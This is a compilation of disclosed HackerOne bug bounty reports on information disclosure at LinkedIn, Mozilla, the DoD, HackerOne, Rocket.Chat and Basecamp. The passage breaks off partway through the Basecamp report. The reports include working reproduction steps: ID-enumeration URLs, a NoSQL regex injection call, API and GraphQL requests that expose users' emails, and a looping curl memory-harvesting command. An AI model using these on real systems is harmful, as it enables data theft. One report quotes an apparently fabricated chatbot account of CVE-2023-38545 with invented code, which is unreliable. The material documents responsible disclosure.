Remove the folder or make it private at least

---

### [Mail auto configurator can be tricked into sending account information to wrong servers ](https://hackerone.com/reports/2508422)

- **Report ID:** `2508422`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Nextcloud
- **Reporter:** @shushangw
- **Bounty:** 100 usd
- **Disclosed:** 2024-11-15T13:11:10.418Z
- **CVE(s):** CVE-2024-52508

**Summary (team):**

Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-vmhx-hwph-q6mc

---

### [Can see phone numbers of others by providing mail address](https://hackerone.com/reports/2534458)

- **Report ID:** `2534458`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** LinkedIn
- **Reporter:** @sevada797
- **Bounty:** - usd
- **Disclosed:** 2024-11-13T18:05:48.871Z
- **CVE(s):** -

**Vulnerability Information:**

It is possible for an attacker to see anyone's phone numbers abusing bug in reset password functionality. Bug allows to see anyone's phone number via email address. I will provide video POC a bit later.

Steps to reproduce.
1) Go to `Forget password` page ███
2) Type your email press enter
3) After verification code is sent to your mail, Press can't access this email
4) You will see half of the phone number with that account,  select the checkbox with phone number and press `Send code`
5) You will be surprised seeing the phone number in the input tag visible to eye even without inspecting the page further
Saying  `Your phone is not set up for password recovery. Please use one of the confirmed emails or eligible phone linked to your account.`

## Impact

The exposure of users' phone numbers presents several security and privacy risks:

Privacy Violation: Users' private information is exposed without their consent.
Phishing Attacks: Attackers can use the obtained phone numbers to launch targeted phishing attacks.
Social Engineering: Attackers may exploit the information to impersonate users or gather more personal details through social engineering tactics.
Further Compromise: Knowledge of the phone number could potentially aid in other forms of attacks, such as SIM swapping or bypassing two-factor authentication (2FA).

**Summary (team):**

The issue reported was about exposure of LinkedIn member's phone number due to the logical flaw in reset password functionality. The issue has been resolved on priority. Thanks @sevada797 for the report.

---

### [Pull Any Automated Record Brief](https://hackerone.com/reports/1541740)

- **Report ID:** `1541740`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @badlifeguard
- **Bounty:** - usd
- **Disclosed:** 2024-10-25T15:23:37.560Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:** With some simple URL manipulation, an authenticated user is able to request other soldiers ARB/ORBs. 

## References
I am able to pull my own "Current Automated Record Brief", "Selection Board Record Brief", and all validated ones, then manipulate numbers in the request URL, and then pull any other valid number to pull a soldier. URL ID: "SRBHeaderID=#######"

## Impact

After pulling an ARB/ORB, someone would have access to view their last 4 SSN, Date of Birth, Place of birth, Clearance information, Mailing Address, and DODID. With most recent breaches of SSNs, one attacker would have enough information to verify and impersonate another soldier for malicious purposes.

## System Host(s)
█████, ████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Authenticate to https://████/SelfService/home/selfservice

Then you can test by clicking on your own "My Record Brief".

Enter developer mode in your chosen browser. 
First choose your "View Current Automated Record Brief"
In developer mode watch for "Network request" (Where 000000 will be your ID for your non-board record:  Index?SRBHeaderID=000000&isBoard=false&OT=0

You can manipulate the SRBHeaderID from 000001 to at least 4500000.

Similar to the other buttons, lead to the same results SRBHeaderID, Board, and OT change values.
Current Automated Record Brief
https://█████/SelfService/esrbss/PDF/Index?SRBHeaderID=000000&isBoard=false&OT=0
Current Selection Board Record Brief
https://█████████/SelfService/esrbss/PDF/Index?SRBHeaderID=000000&isBoard=true&OT=0
Validated Automated Record Brief
https://███████/SelfService/esrbss/PDF/Index?SRBHeaderID=0000000&isBoard=false&OT=2
Certified Selection Board Record Brief
https://█████/SelfService/esrbss/PDF/Index?SRBHeaderID=0000000&isBoard=true&OT=5

## Suggested Mitigation/Remediation Actions
Lock permissions on access to Record Brief files produced, generate the PDF from the backend, randomize/tokenize the URL to give one time URLs.

---

### [two aws access key and secret key and database username and password exposed ](https://hackerone.com/reports/2401648)

- **Report ID:** `2401648`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Mozilla
- **Reporter:** @ghaazy
- **Bounty:** - usd
- **Disclosed:** 2024-10-18T08:01:06.029Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
hello mozilla security team i found two aws access key and secret key and database username and password exposed  in dockerhub image 

## Steps To Reproduce:
go to https://hub.docker.com/r/mozilla/commonvoice
and do pull for this image
you will find them in 
/code/scripts/test/config.json
███████
poc of  the asw keys 
████
and also 
████
reference 
{F3097699}
and the enum for it 
████████
## Supporting Material/References
  *https://hackerone.com/reports/1720278
  * https://hackerone.com/reports/1580567

## Impact

## Summary:
exposure of sensitive data lead to many serious attacks and access

**Summary (team):**

A security vulnerability is identified in a Docker image hosted on Docker Hub. The image, associated with Mozilla's Common Voice project, is found to contain exposed AWS access keys, AWS secret keys, and database credentials. These sensitive credentials are discovered within the file /code/scripts/test/config.json of the Docker image and allowed unauthorized access to AWS resources associated with the project.  The images were deleted from docker hub, the credentials were rotated and the AWS users associated with them were removed.

Note that Common Voice is out of scope of our program but we accepted and rewarded this report since it is critical.

---

### [User API Key leakage in Github commit leads to unauthorized access to sql.telemetry.mozilla.org](https://hackerone.com/reports/2735646)

- **Report ID:** `2735646`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Mozilla
- **Reporter:** @anhchangmutrang
- **Bounty:** - usd
- **Disclosed:** 2024-10-08T07:56:01.316Z
- **CVE(s):** -

**Summary (team):**

A Mozilla employee's API token for https://sql.telemetry.mozilla.org was leaked in one of our Github repos. The token provided access to the service dashboard which contained confidential data. The API token was rotated and removed from the service. 
 
Note that this asset is out of scope of our program, however, we accepted the report since the reported issue is high.

---

### [Course Registration Form Allowing an attacker to dump all the candidate name who had enrolled for the course](https://hackerone.com/reports/1100383)

- **Report ID:** `1100383`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @steveflex
- **Bounty:** - usd
- **Disclosed:** 2024-08-16T16:09:19.413Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 

The given application has a form to fill in the details of the candidates in order to seek admission to various courses. The application has the functionality to submit the given form and provide a registration confirmation to the candidate with their name on the page. By cycling the parameter we can enumerate all the applicant's names who had applied for the specific courses.

**Description:**
We can cycle the numeric value after the registration process and enumerate all the candidate names.

## Impact
The attacker might carry out targeted attacks against the given organization by exfiltrating details from the candidates. The attacker can also find the candidates easily on social media sites to carry out further attacks.

## Step-by-step Reproduction Instructions

1. Fill in the form in order to apply/register for the courses online  https://www2.█████████/asops/CESET/DotNet/(S(zxfdh3222tuxim4qkyddqkc4))/Register.aspx?s=1&c=SOC-E
2. After the form is filled, the confirmation messaged is displayed in a URL as https://www2.████████/asops/CESET/DotNet/(S(y4xw2rqkzk1zzzej0mu2atng))/RegistrationConfirmation.aspx?stu=490504
3. The attacker can cycle the stu value from the beginning and enumerate thousand of candidates enrolled for the courses. 
4. Here we have automated the attack in order to get user details in a short period of time. Please refer to the screenshot below having the results.


## Suggested Mitigation/Remediation Actions
The application shall generate hashed values instead of numeric values so that the attacker cannot guess the user details.

## Impact

The attacker might carry out targeted attacks against the given organization by exfiltrating details from the candidates. The attacker can also find the candidates easily on social media sites to carry out further attacks.

## System Host(s)
www2.██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Fill in the form in order to apply/register for the courses online  https://www2.███████/asops/CESET/DotNet/(S(zxfdh3222tuxim4qkyddqkc4))/Register.aspx?s=1&c=SOC-E
2. After the form is filled, the confirmation messaged is displayed in a URL as https://www2.██████/asops/CESET/DotNet/(S(y4xw2rqkzk1zzzej0mu2atng))/RegistrationConfirmation.aspx?stu=490504
3. The attacker can cycle the stu value from the beginning and enumerate thousand of candidates enrolled for the courses. 
4. Here we have automated the attack in order to get user details in a short period of time. Please refer to the screenshot below having the results.

## Suggested Mitigation/Remediation Actions

---

### [Pinning leaks message content](https://hackerone.com/reports/1062538)

- **Report ID:** `1062538`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Rocket.Chat
- **Reporter:** @gronke
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T21:53:50.125Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** Improper input validation allows pinning of arbitrary messages (in private channels), leaking the message content back to the sender.

**Description:**

Message pinning was found to lack input data validation, so that arbitrary messages can be pinned and leaked back to an unauthorized client.

```javascript
Meteor.methods({
	pinMessage(message) {
		if (!Meteor.userId()) {
			toastr.error(TAPi18n.__('error-not-authorized'));
			return false;
		}
		if (!settings.get('Message_AllowPinning')) {
			toastr.error(TAPi18n.__('pinning-not-allowed'));
			return false;
		}
		if (Subscriptions.findOne({ rid: message.rid }) == null) {
			toastr.error(TAPi18n.__('error-pinning-message'));
			return false;
		}
		toastr.success(TAPi18n.__('Message_has_been_pinned'));
		return ChatMessage.update({
			_id: message._id,
		}, {
			$set: {
				pinned: true,
			},
		});
	},
	// ...
});
```

The Meteor.method `pinMessage` accepts a message object as input with `_id` and `rid` keys.

With a known Message ID and any Room ID that is accessible by the attacker, the check room subscriptions can be circumvented, because the target chat message is not validated to be in the same room as validated with `Subscriptions.findOne({ rid: message.rid }`.

In addition to that the `pinMessage` function accepts JavaScript objects that are then directly forwarded to the MongoDB model, allowing attackers to use regular expressions to improve guessing of message IDs.

```javascript
Meteor.call("pinMessage", {
  _id: { $regex: /.*/ },
  rid: "<ACCESSIBLE_ROOM_ID>" 
}, (...args) => console.log(...args));
```

The Meteor.call return data contains the message content, so that an arbitrary user with access to any channel can leak individual messages outside of their accessible channels.

## Releases Affected:

  * 3.9.10 / develop

## Steps To Reproduce (from initial installation to vulnerability):

(Add details for how we can reproduce the issue)

  1. Open Rocket.Chat
  2. Find any accessible Room ID (for instance from channel avatar URL)
  3. Open Web Inspector
  4. Execute pinMessage Meteor.call and receive message content in return callback

## Suggested mitigation

  * Check message object data types
  * Query the target `rid` along with the updated message `_id`.

```diff
diff --git a/app/message-pin/client/pinMessage.js b/app/message-pin/client/pinMessage.js
index 9fbc2f778..c360c5d9c 100644
--- a/app/message-pin/client/pinMessage.js
+++ b/app/message-pin/client/pinMessage.js
@@ -1,4 +1,5 @@
 import { Meteor } from 'meteor/meteor';
+import { check } from 'meteor/check';
 import toastr from 'toastr';
 import { TAPi18n } from 'meteor/rocketchat:tap-i18n';
 
@@ -7,6 +8,8 @@ import { ChatMessage, Subscriptions } from '../../models';
 
 Meteor.methods({
        pinMessage(message) {
+               check(message._id, String);
+               check(message.rid, String);
                if (!Meteor.userId()) {
                        toastr.error(TAPi18n.__('error-not-authorized'));
                        return false;
@@ -22,6 +25,7 @@ Meteor.methods({
                toastr.success(TAPi18n.__('Message_has_been_pinned'));
                return ChatMessage.update({
                        _id: message._id,
+                       rid: message.rid
                }, {
                        $set: {
                                pinned: true,
@@ -29,6 +33,8 @@ Meteor.methods({
                });
        },
        unpinMessage(message) {
+               check(message._id, String);
+               check(message.rid, String);
                if (!Meteor.userId()) {
                        toastr.error(TAPi18n.__('error-not-authorized'));
                        return false;
@@ -44,6 +50,7 @@ Meteor.methods({
                toastr.success(TAPi18n.__('Message_has_been_unpinned'));
                return ChatMessage.update({
                        _id: message._id,
+                       rid: message.rid
                }, {
                        $set: {
                                pinned: false,
```

## Impact

Content of arbitrary (private) messages can be leaked by any client with access to at least one room.

---

### [Leaking usernames through endpoints Wordpress](https://hackerone.com/reports/1785021)

- **Report ID:** `1785021`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** MTN Group
- **Reporter:** @alitoni224
- **Bounty:** - usd
- **Disclosed:** 2024-08-10T01:20:23.256Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hi first, some of my usernames have been leaked by endpoints https://alt.mtn.com/wp-json/wp/v2/users

## Steps To Reproduce:
[The steps are as follows]

  1. Open the subdomain https://alt.mtn.com 
  1. Add the path https://alt.mtn.com/wp-json/wp/v2/users/192
  1. [You will notice the user information and you can also reveal many user names by changing it id user As in the pictures ]
{F2050805}
{F2050804}

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  #1735586
#356047

## Impact

by API The attacker can find many information and names of active users

---

### [https://srcds.valve.net/find/ is leaking server config / API keys](https://hackerone.com/reports/1168557)

- **Report ID:** `1168557`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-08-06T21:14:40.837Z
- **CVE(s):** -

**Summary (team):**

Insufficient access control allowed unauthenticated visitors to see sensitive configuration information about Source game servers.

**Summary (researcher):**

.

---

### [Two-factor authentication bypass lead to information disclosure about the program and all hackers participate](https://hackerone.com/reports/2486086)

- **Report ID:** `2486086`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @bob004x
- **Bounty:** - usd
- **Disclosed:** 2024-07-11T15:13:00.373Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Two-factor authentication bypass lead to information disclosure about the program and all hackers participate  

**Description:**
Hi dear
 when you have an invitation from a program and to accept that invitation to see the program content you need to have Two-factor authentication turned on , 
try to use google app ==without an account== to turn on the tow factor in that way you can access the apps and accept the invitation and see all the program details and all hacker participate 
if you back to turn off the tow factor and set it again with your email from google app  you will find that you have been emailed again with invitations to accept it   
 like you didn't see that before

### Steps To Reproduce

1. Turn on the tow factor with any mobile with option  ==without an account==

2. Try to access your invitation for any program  

3. Accept the invitation to see all the program data and all participate

4-Back to turn off  the  tow factor

5-Turn on again and connect it that time==with your email== from google app 

6-You will notice that you have been invited again to the same programs via email 
████

███████

7- Accept the invitation that time to see all the data you have seen before    



██████████
==In the video you will notice that i have accept the invitation for mondoo  program two times with the two factor time setup==

## Impact

information disclosure for all the private programs data without being accepting the invitation

---

### [Jira Credential Disclosure within Mozilla Slack](https://hackerone.com/reports/2467999)

- **Report ID:** `2467999`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Mozilla
- **Reporter:** @griffinf
- **Bounty:** 1000 usd
- **Disclosed:** 2024-04-23T12:13:25.734Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I was able to find Jira Admin API Keys disclosed within Mozilla's #███ Slack channel which was posted by a staff member of Mozilla.

## Steps To Reproduce:
  1.Navigate to the following file -█████
  2.Observe the exposed credentials on line 310-312 of the Python Script.
  3. Verify Groups with the following CURL request - `curl -u "██████:ATATT3xFfGF0V99l_█████████551CCC5D" -H "Content-Type: application/json" https://mozilla-hub.atlassian.net/rest/api/3/user/groups?accountId=████████`
 
4. Observe the following output which shows that the user is a Jira Administrator, Administrator and  Jira Service Desk user etc.

[{"name":"jira-servicedesk-users","groupId":"███","self":"███████:"jira-administrators","groupId":"████████","self":██████:"jira-software-users","groupId":"███","self":██████████:"jira-servicemanagement-customers-mozilla-hub","groupId":"██████████","self":███:"site-admins","groupId":"████████","self":██████:"administrators","groupId":"██████████","self":██████:"Managers","groupId":"█████","self":██████"}]

## Impact

## Summary:

Admin API credentials provide elevated privileges that can grant access to all projects, user accounts, configurations, and other sensitive data stored in Jira.

**Summary (team):**

The reporter who is an NDA'd contributor with access to internal Mozilla slack instance found a Jira admin API token hard-coded in a script which was shared in a public slack channel. The API key was revoked and the script was deleted from the public channel.

---

### [Docker Secret Disclosure via GitHub Actions Cache Poisoning](https://hackerone.com/reports/2410111)

- **Report ID:** `2410111`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @adnanthekhan
- **Bounty:** - usd
- **Disclosed:** 2024-04-20T13:38:53.646Z
- **CVE(s):** -

**Summary (team):**

An issue was reported whereby GitHub secrets were leaked via GitHub Actions. We worked with the reporter to resolve this issue, and it appears widespread.

---

### [View any user email using the Team's audit log section](https://hackerone.com/reports/2404415)

- **Report ID:** `2404415`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @0v3rw4tch
- **Bounty:** - usd
- **Disclosed:** 2024-03-26T14:00:46.469Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hello team, I decided to do some further testing, and I came across another endpoint that can be used to reveal user emails. 

### Steps To Reproduce

1. Create a demo in your account https://hackerone.com/teams/new/sandbox
2. Create a token with the report manager role on https://hackerone.com/organizations/demo/settings/api_tokens
3. Copy the user ID of any user that has an account on HackerOne
4. A program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is the id of your sandbox program.
```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"2869549\",\n          \"amount\": 51,\n      \"reference\": \"newbounty1\",\n      \"title\": \"BOUNTY\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});
```
5. You will get a success message
6. After awarding the bounty to the user, head over to the audit log section of your sandbox team.
7. Notice a message is shown `"@api" awarded a $51.00 bounty to "email@email.com"`

POC
████

## Impact

View emails of other users

---

### [Creation of bounties through Customer API leads to private email disclosure](https://hackerone.com/reports/2382120)

- **Report ID:** `2382120`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** HackerOne
- **Reporter:** @0v3rw4tch
- **Bounty:** - usd
- **Disclosed:** 2024-03-26T13:10:59.472Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Hello team,
It is possible to reveal any user email using the `BountiesHistoryQuery` request.
To demonstrate this, I will make use of both the API and the graphql requests.

### Steps To Reproduce

1. Log in to your account and create a demo
2. Head over to https://hackerone.com/organizations/████/settings/api_tokens and create a token with the report manager role
3. Head over to any profile of a user in hackerone and copy their user id
4. Use this request below to award a program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is your sandbox program id.
```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"██████████\",\n          \"amount\": 51,\n      \"reference\": \"newbounty\",\n      \"title\": \"BOUNTY FROM Sandbox\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});

```
5. You will get a success message

██████
6. After awarding the bounty, make the following Graphql request. Where `handle` is the handle of your sandbox team
```
{"operationName":"BountiesHistoryQuery","variables":{"handle":"████","pageSize":25,"product_area":"other","product_feature":"other"},"query":"query BountiesHistoryQuery($handle: String!, $pageSize: Int!, $cursor: String) {\n  team(handle: $handle) {\n    id\n    currency\n    offers_bounties\n    state\n    bounties(first: $pageSize, after: $cursor) {\n   pageInfo {\n        endCursor\n        hasNextPage\n        __typename\n      }\n         edges {\n          node {\n          id\n    awarded_user{username} invitations{email token}     awarded_amount\n          awarded_bonus_amount\n          created_at\n          report {\n            id\n            database_id: _id\n            reporter {\n     email          id\n              username\n              __typename\n            }\n            title\n            __typename\n          }\n          total_awarded_amount\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```
7. Notice the email of the user is shown in the response

█████████

## Impact

Reveal any user email

---

### [Full Access to sonarQube and Docker](https://hackerone.com/reports/2312609)

- **Report ID:** `2312609`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @micro01
- **Bounty:** - usd
- **Disclosed:** 2024-03-22T17:35:47.152Z
- **CVE(s):** -

**Summary (team):**

This vulnerability involves the exposure of sensitive credentials and IP addresses in a JavaScript file. I gained access to your Hub Docker account and Sonar projects, allowing me to identify and assess the extent of the issue. The vulnerability stems from a JS file within your application that contains hard-coded sensitive credentials, such as usernames, passwords, and potentially API keys. Additionally, it exposes IP addresses associated with your infrastructure. This sensitive information is readily accessible to anyone with access to the file, making it susceptible to unauthorized access and potential misuse.

---

### [Exposure of service tokens to webpack bundle](https://hackerone.com/reports/1717210)

- **Report ID:** `1717210`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Semrush
- **Reporter:** @a_d_a_m
- **Bounty:** - usd
- **Disclosed:** 2024-03-08T20:27:32.855Z
- **CVE(s):** -

**Summary (team):**

During the build phase, not essential for the application's functionality environment variables were accidentally included in the webpack configuration file. This oversight led to their exposure in the final bundle.
The subsequent internal review revealed no evidence of these tokens being used by unauthorized parties.

---

### [Sensitive Information Exposed at █████](https://hackerone.com/reports/2308654)

- **Report ID:** `2308654`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Mars
- **Reporter:** @m3ntor
- **Bounty:** - usd
- **Disclosed:** 2024-01-30T19:21:57.693Z
- **CVE(s):** -

**Summary (team):**

The issue involves a JavaScript file hosted at "█████" that exposes a configuration or environment variables object. This object contain crucial information such as settings, credentials, and paths related to the deployment and execution environment of a JavaScript application, suggesting a potential security risk. The exposed information may be associated with a Continuous Integration/Continuous Deployment (CI/CD) setup using GitLab. This exposure could lead to unauthorized access or manipulation of sensitive data, posing a security threat to the application and its environment.

---

### [Datadog api keys exposed can be used to do all the read and write access to the instance](https://hackerone.com/reports/2307933)

- **Report ID:** `2307933`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** Mars
- **Reporter:** @harshdranjan
- **Bounty:** - usd
- **Disclosed:** 2024-01-25T19:17:06.236Z
- **CVE(s):** -

**Summary (team):**

The researcher identified DatadogHQ API keys and application keys embedded in a JavaScript (JS) file on the site █████. These keys could potentially provide unauthorized access to DatadogHQ services. The researcher responsibly reported the issue, providing a proof-of-concept (PoC) to demonstrate the vulnerability without exploiting it further.

---

### [[Critical] Curl CVE-2023-38545 vulnerability code changes are disclosed on the internet](https://hackerone.com/reports/2199174)

- **Report ID:** `2199174`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** curl
- **Reporter:** @shelldoit
- **Bounty:** - usd
- **Disclosed:** 2023-10-16T12:32:27.535Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Curl CVE-2023-38545 vulnerability code changes are disclosed on the internet

## Steps To Reproduce:
To replicate the issue, I have searched in the Bard about this vulnerability. It disclosed what this vulnerability is about, code changes made for this fix, who made these changes, commit details etc even though this information is not released yet on the internet. In addition to it, I was able to easily craft the exploit based on the information available. Remove this information from the internet ASAP!!!!

Vulnerability information:

The vulnerability is caused by an integer overflow in the curl_easy_setopt() function.
The vulnerability can be exploited by an attacker to execute arbitrary code on a vulnerable system.
The vulnerability is fixed in curl 8.4.0 and higher.

Code fixes:
The following code changes fixed CVE-2023-38545 in curl:

C
/*
 * CVE-2023-38545: Integer overflow in curl_easy_setopt()
 *
 * This vulnerability could be exploited to cause a denial-of-service attack or
 * to execute arbitrary code on the victim's system.
 *
 * The following code changes fix this vulnerability by checking the value of the
 * timeout argument before passing it to the internal curl function.
 */

#include "curl.h"

/*
 * curl_easy_setopt()
 *
 * Sets an option value for a curl handle.
 *
 * @param handle The curl handle.
 * @param option The option to set.
 * @param param The value to set the option to.
 *
 * @return CURLE_OK on success, or a curl error code on failure.
 */

CURLcode curl_easy_setopt(CURL *handle, CURLoption option, ...)
{
  va_list param;
  CURLcode ret;

  va_start(param, option);

  switch (option) {
    case CURLOPT_TIMEOUT: {
      long timeout = va_arg(param, long);

      /* Check for integer overflow. */
      if (timeout < 0 || timeout > LONG_MAX) {
        va_end(param);
        return CURLE_BAD_FUNCTION_ARGUMENT;
      }

      ret = curl_easy_setopt_timeout(handle, timeout);
      break;
    }

    default:
      ret = curl_easy_setopt_custom(handle, option, param);
      break;
  }

  va_end(param);

  return ret;
}
Use code with caution. Learn more
These code changes were made in commit 9414975, which was released in curl version 8.4.0.


Who made these changes and commit details:
The code changes to fix CVE-2023-38545 were made by Dxxxxl Sxxxxg, the maintainer of curl. The changes were made in commit 9414975, which was released in curl version 8.4.0.

Dxxxxl Sxxxxg is a Swedish computer programmer and the creator and maintainer of curl. He has been working on curl for over 20 years and is considered to be one of the leading experts on web transfer protocols.

## Impact

Disclosing undisclosed vulnerability code can have a number of negative implications, including:

Putting users at risk. Once a vulnerability is disclosed publicly, attackers can start exploiting it. This can put users of the affected software at risk of data breaches, malware infections, and other attacks.
Damaging the vendor's reputation. Vendors take pride in the security of their products and services. Disclosing a vulnerability publicly can damage the vendor's reputation and lead to lost customers.
Making it more difficult for the vendor to fix the vulnerability. If a vulnerability is disclosed publicly before the vendor has a chance to fix it, it can make it more difficult for the vendor to coordinate a patch release. This can leave users vulnerable to attacks for longer.
Encouraging other attackers to find and disclose vulnerabilities. When attackers see that they can get attention and recognition by disclosing vulnerabilities, they are more likely to look for them. This can lead to an increase in the number of vulnerabilities that are disclosed publicly.

---

### [LinkedIn users primary email + full name visibilty](https://hackerone.com/reports/878724)

- **Report ID:** `878724`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** LinkedIn
- **Reporter:** @headhunter
- **Bounty:** - usd
- **Disclosed:** 2023-09-25T18:42:32.526Z
- **CVE(s):** -

**Summary (team):**

The issue identified by the researcher allowed LinkedIn Recruiter seat holders to share data with those outside their contract. After validating the vulnerability report, a fix was deployed.

**Summary (researcher):**

The identified issue allowed attacker to get email of any LinkedIn user using admin settings of  LinkedIn Recruiter Product.

---

### [Access to resumes applied through LinkedIn Jobs](https://hackerone.com/reports/560668)

- **Report ID:** `560668`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** LinkedIn
- **Reporter:** @headhunter
- **Bounty:** - usd
- **Disclosed:** 2023-09-22T18:32:24.450Z
- **CVE(s):** -

**Summary (team):**

The security issue identified by the researcher allowed LinkedIn Recruiter seat holders to view data about job applicants that exceeded permissions. After validating the vulnerability report, a fix was deployed to production within 24 hours.

---

### [AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp](https://hackerone.com/reports/2107680)

- **Report ID:** `2107680`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Basecamp
- **Reporter:** @neex
- **Bounty:** 8868 usd
- **Disclosed:** 2023-09-21T15:17:24.982Z
- **CVE(s):** -

**Vulnerability Information:**

Basecamp supports uploading SVG pictures as avatars. Apparently, they are converted via an outdated librsvg version at Basecamp's servers. This version contains a vulnerability that allows leakage of the contents of an uninitialized memory block (that is, something is malloced, never initialized, and then used to build the preview image). Since it seems to be performed in the same unix process as the general request processing, it is possible for an attacker to steal sensitive data from this process, including basecamp configs (e.g., AWS keys) and requests of random users.

## Steps to reproduce

1. First, you must generate an image that triggers the vulnerability. To do so, you will need Python installed. Download the attached program F2597505 and run it like this: `python3 rsvgeb.py gen 260x260 --format bmp zalupa.png` (exactly like this). The result will be stored in the `zalupa.png` file (which is actually an SVG). The picture contains the exploit itself and carefully chosen SVG filters that make it possible to recover the original data regardless of later conversion artifacts.
2. Second, upload the resulting image as your avatar. Login to your Basecamp account, go to your profile (click on the circle image at the top left corner, then go to "Profile, password, ███"), there use the "Change your avatar button" and select the `zalupa.png` we generated earlier. Don't forget to click on the green button "Save my changes" at the bottom of the page.
3. After the avatar update, you will see the pixel image instead of the avatar. We'll use `rsvgeb.py` again to extract the information. However, the script uses ImageMagick to extract pixel data from PNG files, so you will need it installed *locally* (at the environment where the `rsvgeb.py` is ran). `apt install imagemagick -y` should be enough on Debian and Ubuntu systems. 
4. After installing ImageMagick, you must retrieve the public link to your avatar. To do this, click on your avatar with the right mouse button, and choose "Copy image address". After that, open the copied link in a new tab to follow the redirect. The link should change from something like `████` to something like `████████`. Copy the latter one.
5. Now, you need to modify the link. Replace the `.avif` extension with `.png`, and the filename (the part right before the extension) with the string `$RANDOM$RANDOM$RANDOM$RANDOM`. After that, insert the link as the `curl` argument into the following command:

     ```
     while true; do curl "████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done
     ```

    (note how the link looks; yours should also be like this except for the user id and the signed something part).
6. Execute the command. You will see fragments of memory from some Basecamp servers that will also accumulate in `pizda_hui_govno.txt`. Sometimes you will see trash or parts of the original SVG, but sometimes you will see fascinating pieces of information. Keep the script running for some time so you will get more sensitive memory fragments (I ran it for 48+ hours). Inspect `pizda_hui_govno.txt` to check what you have.

## Impact

Given the nature of the vulnerability, the attacker does not control which kind of information she will extract. However, due to the lack of isolation between the image converter process and the main Ruby on Rails application, the extracted info might be quite sensitive.

Seemingly, the most exciting fragment I came across included AWS keys and looked like this:

```
    ███
    ██████████
    ██████
    █████████
    -----END RSA PRIVATE KEY-----

s3_backup:
  access_key_id: ██████████
  secret_access_key: █████

sns:
  access_key_id: ███████
  secret_access_key: █████

active_record_encryption:
  primary_key: █████████
  deterministic_key: █████████
  key_derivation_salt: █████

new_relic:
  license_key: ██████
```

That is, apparently, a fragment of some internal Basecamp config. Other similar configs include:

```
production_s3_primary:
  service: S3
  access_key_id: ███
  secret_access_key: █████
  region: us-east-2
  bucket: ███
  upload:
    storage_class: INTELLIGENT_TIERING

production_s3_replica:
  service: S3
  access_key_id: ████████
  secret_access_key: ███
  region: us-west-2
  bucket: ████████
  upload:
    storage_class: ONEZONE_IA
```

I've checked that the keys actually work, but have not performed any post exploitation:

```
$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████ AWS_SECRET_ACCESS_KEY=██████ aws sts get-caller-identity
{
    "UserId": "██████",
    "Account": "██████████",
